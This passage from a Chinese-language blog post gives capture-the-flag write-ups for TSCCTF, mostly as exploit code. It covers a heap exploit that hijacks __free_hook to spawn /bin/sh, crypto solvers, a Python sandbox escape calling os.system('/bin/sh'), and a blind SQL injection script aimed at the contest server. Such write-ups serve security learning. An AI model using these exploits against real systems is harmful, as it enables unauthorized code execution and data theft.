class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">5</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">copy(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;\xa0\x86&#x27;</span>)</span><br><span class="line">alloc(<span class="number">6</span>, <span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leaklibc = u64(rcl()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">libcbase = leaklibc - <span class="number">0x1ec980</span></span><br><span class="line"></span><br><span class="line">libc_freehook = libcbase + <span class="number">0x1eee48</span></span><br><span class="line">libc_system = libcbase + <span class="number">0x52290</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">8</span>, <span class="number">0x50</span>)</span><br><span class="line">alloc(<span class="number">9</span>, <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,p64(libc_freehook))</span><br><span class="line">alloc(<span class="number">10</span>, <span class="number">0x50</span>)</span><br><span class="line">alloc(<span class="number">11</span>, <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>, p64(libc_system))</span><br><span class="line">alloc(<span class="number">12</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#NAUPINFO(&quot;PID&quot;,r.pid)</span></span><br><span class="line">NAUPINFO(<span class="string">&quot;IO_STDOUT&quot;</span>,<span class="built_in">hex</span>(<span class="number">0x1ed6a0</span>))</span><br><span class="line">NAUPINFO(<span class="string">&quot;LEAKLIBC&quot;</span>,<span class="built_in">hex</span>(leaklibc))</span><br><span class="line">NAUPINFO(<span class="string">&quot;LIBCBASE&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>


<blockquote>
<p>TSCCTF{w0w_y0u_hav3_succ3ss4_1nsp3ct_th3_s3cr3t_congrats}</p>
</blockquote>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="2DES"><a href="#2DES" class="headerlink" title="2DES"></a>2DES</h2><p>DES 弱密鑰對</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;172.31.2.2&quot;</span>,<span class="number">9487</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1FE01FE00EF10EF1 &amp; E01FE01FF10EF10E</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;E01FE01FF10EF10E&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Enter key2 (hex): &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="我從來都不覺得算密碼學開心過"><a href="#我從來都不覺得算密碼學開心過" class="headerlink" title="我從來都不覺得算密碼學開心過"></a>我從來都不覺得算密碼學開心過</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/ryi75CrPkl.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryi75CrPkl.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>枚舉其中一個 r 看解不解的出來</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad,unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line">p = <span class="number">42899</span></span><br><span class="line"></span><br><span class="line">hashes=[<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line">hashes[<span class="number">0</span>] = <span class="number">1934</span></span><br><span class="line">hashes[<span class="number">1</span>] = <span class="number">22627</span></span><br><span class="line">hashes[<span class="number">2</span>] = <span class="number">36616</span></span><br><span class="line">hashes[<span class="number">3</span>] = <span class="number">21343</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;z\xa5\xa5\x1d\xe5\xd2I\xb1\x15\xec\x95\x8b^\xb6:r=\xe3h\x06-\xe9\x01\xda\xc03\xa4\xf6\xa8_\x8c\x12!MZP\x17O\xee\xa3\x0f\x05\x0b\xea7cnP&#x27;</span></span><br><span class="line"></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line">b= <span class="number">2</span>**<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line"></span><br><span class="line">    key=((((((((i*b)+<span class="number">14592</span>)*b)+<span class="number">15642</span>)*b)+<span class="number">9859</span>)*b)+<span class="number">21343</span>)*b</span><br><span class="line">    key = pad(long_to_bytes(key), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># Decrypt the ciphertext</span></span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decrypted_flag = aes.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;TSC&#123;&#x27;</span> <span class="keyword">in</span> decrypted_flag:</span><br><span class="line">        <span class="built_in">print</span>(decrypted_flag)</span><br></pre></td></tr></table></figure>

<h2 id="AES-Encryption-Oracle"><a href="#AES-Encryption-Oracle" class="headerlink" title="AES Encryption Oracle"></a>AES Encryption Oracle</h2><p>難的是寫腳本<br>知道這張圖在幹嘛就行</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/BkWtc1UDJx.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkWtc1UDJx.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>我們可以 leak 相鄰兩個 block 及 flag<br>所以只要 <code>第 n 個block(第一個是 IV，之後是 C) xor DEC(第 n+1 個block, key) = m </code> </p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/HkAwrk8Pkg.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HkAwrk8Pkg.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc_decrypt</span>(<span class="params">encrypted_msg: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Decrypts a message encrypted using AES in CBC mode.</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        encrypted_msg (bytes): The encrypted message (IV + ciphertext).</span></span><br><span class="line"><span class="string">        key (bytes): The decryption key (must be 16, 24, or 32 bytes long).</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        bytes: The original plaintext message.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) <span class="keyword">not</span> <span class="keyword">in</span> &#123;<span class="number">16</span>, <span class="number">24</span>, <span class="number">32</span>&#125;:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Key must be 16, 24, or 32 bytes long.&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Extract the IV (first 16 bytes) and ciphertext (remaining bytes)</span></span><br><span class="line">    iv = encrypted_msg[:<span class="number">16</span>]</span><br><span class="line">    ciphertext = encrypted_msg[<span class="number">16</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Create the AES cipher in CBC mode</span></span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Decrypt the ciphertext</span></span><br><span class="line">    padded_msg = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Remove padding from the decrypted message</span></span><br><span class="line">    <span class="comment"># unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span></span><br><span class="line">    <span class="comment"># msg = unpadder.update(padded_msg) + unpadder.finalize()</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> padded_msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_bytes</span>(<span class="params">inputstr</span>):</span><br><span class="line">    <span class="comment"># 使用 ast.literal_eval 來解析字串中的轉義序列</span></span><br><span class="line">    <span class="keyword">return</span> ast.literal_eval(<span class="string">f&quot;b&#x27;<span class="subst">&#123;inputstr&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">    cnt_end = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">round</span>)</span><br><span class="line">            prev_round = <span class="built_in">round</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;===== ROUND <span class="subst">&#123;<span class="built_in">round</span>//<span class="number">16</span>&#125;</span> AND block <span class="subst">&#123;<span class="built_in">round</span>&#125;</span> =====&quot;</span>)</span><br><span class="line">            r = remote(<span class="string">&quot;172.31.2.2&quot;</span>,<span class="number">36363</span>)</span><br><span class="line"></span><br><span class="line">            r.sendlineafter(<span class="string">b&#x27;What do you want to know? &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">round</span>).encode())</span><br><span class="line">            </span><br><span class="line">            aaa = r.recvline().split(<span class="string">b&quot;= b&quot;</span>)[<span class="number">1</span>].strip()[<span class="number">1</span>:-<span class="number">1</span>].decode()</span><br><span class="line"></span><br><span class="line">            key = convert_to_bytes(aaa)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;key = &#x27;</span>,key)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;key length = &#x27;</span>,<span class="built_in">len</span>(key))</span><br><span class="line"></span><br><span class="line">            k = r.recvline()</span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line">            aaa = k.split(<span class="string">b&quot;= b&quot;</span>)[<span class="number">1</span>].strip()[<span class="number">1</span>:-<span class="number">1</span>].decode()</span><br><span class="line">            ciphertext = convert_to_bytes(aaa)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> prev_round != <span class="built_in">round</span>:</span><br><span class="line">                cnt_end = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(ciphertext) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> cnt_end == <span class="number">5</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;////////////// end /////////////////&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">round</span>)</span><br><span class="line">                    <span class="built_in">print</span>(ciphertext)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;////////////// end /////////////////&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> prev_round == <span class="built_in">round</span>:</span><br><span class="line">                    cnt_end += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ciphertext = &#x27;</span>,ciphertext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ciphertext length = &#x27;</span>,<span class="built_in">len</span>(ciphertext))</span><br><span class="line"></span><br><span class="line">            IV = ciphertext[:<span class="number">16</span>]</span><br><span class="line">            C = ciphertext[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;IV = &quot;</span>,IV)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;C = &quot;</span>,C)</span><br><span class="line"></span><br><span class="line">            m = aes_cbc_decrypt(ciphertext,key)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bytearray</span>(m))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;a.jpeg&#x27;</span>,  <span class="string">&#x27;ab&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(m)</span><br><span class="line">            </span><br><span class="line">            f.close()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;backup.txt&#x27;</span>,  <span class="string">&#x27;ab&#x27;</span>) <span class="keyword">as</span> aaa:</span><br><span class="line">                aaa.write(<span class="built_in">bytearray</span>(m))</span><br><span class="line"></span><br><span class="line">            aaa.close()</span><br><span class="line"></span><br><span class="line">            r.clean()</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="built_in">round</span> += <span class="number">16</span></span><br><span class="line"></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;**********something error start**************&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            r.clean()</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;**********something error end**************&quot;</span>)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>


<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>No builtins 跟過濾 <code>[]</code><br>用這條 chain + getitem + unicode 就可以了</p>
<p><a target="_blank" rel="noopener" href="https://lingojam.com/ItalicTextGenerator">https://lingojam.com/ItalicTextGenerator</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_.__𝘨𝘦𝘵𝘪𝘵𝘦𝘮__(-1)._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_().__𝘨𝘦𝘵𝘪𝘵𝘦𝘮__(121).𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(&quot;\157\163&quot;).𝘴𝘺𝘴𝘵𝘦𝘮(&quot;\57\142\151\156\57\163\150&quot;)</span><br></pre></td></tr></table></figure>


<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="E4sy-SQLi"><a href="#E4sy-SQLi" class="headerlink" title="E4sy SQLi"></a>E4sy SQLi</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/customize/&lt;product_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@check_db_connection</span></span><br><span class="line"><span class="meta">@csrf.exempt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">customize_product</span>(<span class="params">product_id</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user_id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cursor = db.cursor(dictionary=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 獲取基礎產品信息</span></span><br><span class="line">        cursor.execute(<span class="string">f&quot;SELECT * FROM products WHERE id = <span class="subst">&#123;product_id&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>這裡有 SQL injection 問題，通過看前端會不會被重新導向來確認 flag 是否正確，一個一個 leak，也就是 SQLinjection Boolean base leak flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">BASE_URL = <span class="string">&quot;http://d112027dafd54b089ead4a09e07d1a2f0.e4sy-sqli.tscctf.com:8999&quot;</span></span><br><span class="line">REGISTER_URL = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/register&quot;</span></span><br><span class="line">LOGIN_URL = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/login&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_csrf_token</span>(<span class="params">url</span>):</span><br><span class="line">    response = session.get(url)</span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    csrf_token = soup.find(<span class="string">&#x27;input&#x27;</span>, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;csrf_token&#x27;</span>&#125;)[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> csrf_token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username, password, email</span>):</span><br><span class="line">    csrf_token = get_csrf_token(REGISTER_URL)  </span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: email,</span><br><span class="line">        <span class="string">&#x27;csrf_token&#x27;</span>: csrf_token  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = session.post(REGISTER_URL, data=data)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;註冊成功&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;register success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;register failed&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username, password</span>):</span><br><span class="line">    csrf_token = get_csrf_token(LOGIN_URL) </span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;csrf_token&#x27;</span>: csrf_token  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = session.post(LOGIN_URL, data=data)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;登入成功&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;login failed&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    result = []</span><br><span class="line">    flag = <span class="string">&quot;TSC&#123;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_lowercase+string.digits+string.ascii_uppercase+<span class="string">&quot;_&quot;</span>:</span><br><span class="line">            payload = <span class="string">f&#x27;<span class="subst">&#123;BASE_URL&#125;</span>/customize/1%20AND%20EXISTS%20%28SELECT%201%20FROM%20discount_codes%20WHERE%20code%20LIKE%20BINARY%20%22<span class="subst">&#123;flag + i&#125;</span>%25&quot;)&#x27;</span></span><br><span class="line">            respond = session.get(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;15.6吋多功能筆電，AMD處理器&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> respond.text:</span><br><span class="line"></span><br><span class="line">                flag += i</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;FLAG: &quot;</span>,flag)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    username = <span class="string">&quot;naup&quot;</span></span><br><span class="line">    password = <span class="string">&quot;naup96321&quot;</span></span><br><span class="line">    register(username, password, <span class="string">&quot;naup@example.com&quot;</span>)</span><br><span class="line">    login(username, password)</span><br><span class="line">    </span><br><span class="line">    exploit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="after-all"><a href="#after-all" class="headerlink" title="after all"></a>after all</h1><p>打的很開心，題目很好玩，雖然沒有辦法打有獎金賽區很可惜QQ</p>

            </div>

            <!-- Post information -->
            
            
    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
        <ul class="pagination d-block text-center">
            
            
                <li class="next page-item d-inline"><a href="/2025/01/05/ASISCTF-2022-babyscan/" class="page-link float-right">Older  &rarr;</a></li>
            
        </ul>
    </div>


            
                <!-- Comments -->
                

                

            

        </div>
    </div>
</article> 


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    <style>
        #toc-content .toc-link::before {
            background-color: transparent;
            max-height: 25px;
        }

        #toc-content .toc-link.is-active-link::before {
            background-color: #404040;
        }
    </style>
    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
